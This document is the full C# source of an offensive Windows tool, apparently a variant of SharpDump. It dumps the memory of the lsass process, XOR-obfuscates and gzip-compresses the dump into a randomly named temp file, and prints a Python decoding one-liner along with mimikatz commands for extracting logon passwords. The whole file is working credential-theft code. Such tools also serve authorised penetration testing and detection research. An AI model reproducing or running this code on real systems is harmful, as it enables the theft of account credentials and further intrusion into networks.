using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace SharpDump
{
    public static class Globals
    {
        public static List<(IntPtr ptr, int len, int offset)> Chunks = new List<(IntPtr, int, int)>();
    }

    class Program
    {
        private static readonly char[] chars = "abcdefghijklmnopqrstuvwxyz".ToCharArray();
        private static readonly Random random = new Random();

        public static string GetRandomString(int length = 7)
        {
            var sb = new StringBuilder(length);
            for (int i = 0; i < length; i++)
            {
                sb.Append(chars[random.Next(chars.Length)]);
            }
            return sb.ToString();
        }

        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static void WriteCompressedDumpToFile(string outFile)
        {
            try
            {
                if (File.Exists(outFile))
                {
                    Console.WriteLine("[X] Output file '{0}' already exists, removing", outFile);
                    File.Delete(outFile);
                }

                var lastChunk = Globals.Chunks.OrderByDescending(chunk => chunk.offset).FirstOrDefault();
                byte[] dump = new byte[lastChunk.offset + lastChunk.len];

                unsafe
                {
                    fixed (byte* pin = &dump[0])
                    {
                        foreach (var chunk in Globals.Chunks)
                        {
                            byte* destination = pin + chunk.offset;
                            Buffer.MemoryCopy(
                                (byte*)chunk.ptr,
                                destination,
                                dump.Length - chunk.offset,
                                chunk.len);
                            Marshal.FreeHGlobal(chunk.ptr);
                        }
                    }
                }

                using (FileStream fs = new FileStream(outFile, FileMode.CreateNew))
                using (GZipStream gzipStream = new GZipStream(fs, CompressionMode.Compress, false))
                    gzipStream.Write(dump, 0, dump.Length);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception while compressing file: {0}", ex.Message);
            }
        }

        public static void Minidump(int pid = -1)
        {
            IntPtr targetProcessHandle = IntPtr.Zero;
            uint targetProcessId = 0;

            Process targetProcess = null;
            if (pid == -1)
            {
                Process[] processes = Process.GetProcessesByName("lsass");
                targetProcess = processes[0];
            }
            else
            {
                try
                {
                    targetProcess = Process.GetProcessById(pid);
                }
                catch (Exception ex)
                {
                    // often errors if we can't get a handle to LSASS
                    Console.WriteLine("[X]Exception: {0}", ex.Message);
                    return;
                }
            }

            if (targetProcess.ProcessName == "lsass" && !IsHighIntegrity())
            {
                Console.WriteLine("[X] Not in high integrity, unable to MiniDump!");
                return;
            }

            try
            {
                targetProcessId = (uint)targetProcess.Id;
                targetProcessHandle = targetProcess.Handle;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Error getting handle to {0} ({1}): {2}", targetProcess.ProcessName, targetProcess.Id, ex.Message);
                return;
            }
            bool bRet = false;

            string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
            string gzipFile = String.Format("{0}\\Temp\\{1}.gz", systemRoot, GetRandomString());

            Console.WriteLine();
            Console.WriteLine("[*] Dumping {0} ({1}) to {2}", targetProcess.ProcessName, targetProcess.Id, gzipFile);
            unsafe
            {
                var mci = new MiniDump.MINIDUMP_CALLBACK_INFORMATION
                {
                    CallbackRoutine = new MiniDump.MINIDUMP_CALLBACK_ROUTINE(MiniDump.Callback),
                    CallbackParam = IntPtr.Zero
                };

                bRet = MiniDump.MiniDumpWriteDump(
                    targetProcessHandle,
                    targetProcessId,
                    IntPtr.Zero,
                    MiniDump.MINIDUMP_TYPE.MiniDumpWithFullMemory,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    mci);
            }

            // if not successful
            if (!bRet)
            {
                Console.WriteLine("[X] Dump failed: {0} {1}", bRet, Marshal.GetLastWin32Error());
                return;
            }

            Console.WriteLine("[+] Dump successful!");
            Console.WriteLine("[*] Writing the gzip-compressed dump to {0}", gzipFile);

            WriteCompressedDumpToFile(gzipFile);

            Console.WriteLine();
            Console.WriteLine("[+] Dumping completed. gzip-decompress the file and XOR its contents with 42.", targetProcessId);
            Console.WriteLine("[!] You can use the following Python one-liner:");
            Console.WriteLine();
            Console.WriteLine(@"open('out.dmp','wb').write(bytearray([i^42 for i in __import__('gzip').decompress(open(r'{0}','rb').read())]))", gzipFile);

            string arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            string OS = "";
            var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
            if (regKey != null)
            {
                OS = String.Format("{0}", regKey.GetValue("ProductName"));
            }

            if (pid == -1)
            {
                Console.WriteLine();
                Console.WriteLine("[*] Operating System : {0}", OS);
                Console.WriteLine("[*] Architecture     : {0}", arch);
                Console.WriteLine("[*] Use \"sekurlsa::minidump out.dmp\" \"sekurlsa::logonPasswords full\" on the same OS/arch\n", arch);
            }
        }

        static void Main(string[] args)
        {
            if (args.Length > 1)
            {
                Console.WriteLine("Usage: SharpDump.exe [pid] (If no pid is provided, 'lsass' will be dumped by default.)");
            }

            string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
            string dumpDir = String.Format("{0}\\Temp\\", systemRoot);
            if (!Directory.Exists(dumpDir))
            {
                Console.WriteLine(String.Format("\n[X] Dump directory \"{0}\" doesn't exist!\n", dumpDir));
                return;
            }

            int pid = -1;
            if (
                args.Length == 0
                || int.TryParse(Convert.ToString(args[0]), System.Globalization.NumberStyles.Any, System.Globalization.NumberFormatInfo.InvariantInfo, out pid))
            {
                Minidump(pid);
                return;
            }

            Console.WriteLine("Please make sure the PID is valid.");
        }
    }
}
